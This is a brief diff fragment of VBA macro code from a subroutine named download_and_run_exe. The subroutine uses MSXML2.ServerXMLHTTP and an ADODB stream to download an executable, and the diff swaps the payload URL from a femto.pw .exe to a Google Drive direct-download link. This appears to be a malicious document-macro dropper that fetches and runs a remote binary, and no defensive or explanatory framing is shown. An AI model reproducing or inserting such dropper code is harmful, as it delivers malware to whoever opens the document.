@@ -10,7 +10,7 @@ Sub download_and_run_exe()
 
     Dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
-    xHttp.Open "GET", "https://femto.pw/eqn3.exe", False
+    xHttp.Open "GET", "https://drive.google.com/uc?export=download&id=1Fj3rlaYO_n4t3EmecVG6NyousNQ_lNtQ", False
     xHttp.Send
 
     With bStrm
